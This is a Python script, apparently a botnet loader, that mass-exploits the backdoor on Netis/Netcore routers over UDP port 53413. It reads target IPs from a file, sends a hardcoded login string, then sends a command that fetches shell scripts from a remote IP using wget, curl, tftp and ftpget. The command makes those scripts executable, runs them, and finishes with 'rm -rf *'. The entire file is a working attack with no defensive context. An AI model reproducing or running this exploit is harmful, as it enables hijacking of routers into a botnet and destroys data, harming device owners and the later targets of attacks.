#! python !#
#By; LiGhT
import threading, sys, time, random, socket, re, os

commandpayload = "AA\x00\x00AAAA cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.162.24.85/8UsA.sh; curl -O http://192.162.24.85/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 192.162.24.85 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 192.162.24.85; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 192.162.24.85 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *\x00" # MIPSEL Binary
loginpayload = "AAAAAAAAnetcore\x00" #DONT CHANGE
ips = open(sys.argv[1], "r").readlines()

class netis(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				print "Attempting %s"%(self.ip)
				s.sendto(loginpayload, (self.ip, 53413))
				time.sleep(1.5)
				s.sendto(commandpayload, (self.ip, 53413))
				time.sleep(20)
			except Exception:
				pass

for ip in ips:
	try:
		n = netis(ip)
		n.start()
		time.sleep(0.01)
	except:
		pass
